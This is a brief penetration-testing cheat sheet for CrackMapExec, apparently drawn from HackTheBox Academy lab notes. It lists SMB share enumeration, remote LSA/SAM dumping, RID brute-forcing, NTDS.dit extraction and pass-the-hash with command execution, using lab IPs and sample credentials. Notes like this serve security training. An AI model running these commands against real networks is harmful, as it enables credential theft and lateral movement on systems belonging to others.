**OUTDATED!** Newer one is [[nxc]]
Attacks: #PtH 

```bash
$ crackmapexec smb <IP> --shares -u '' -p ''
```

## Dump LSA/SAM Remotely
```shell-session
$ crackmapexec smb <IP> --local-auth -u bob -p HTB_@cademy_stdnt! --<lsa/sam>
```

## Bruteforce RIDs
```shell-session
$ crackmapexec smb <IP> -u 'guest' -p '' --rid-brute
```
## Dump NTDS.dit
```shell-session
$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

# Pass the Hash
```shell-session
# crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 [-x <COMMAND>]
```
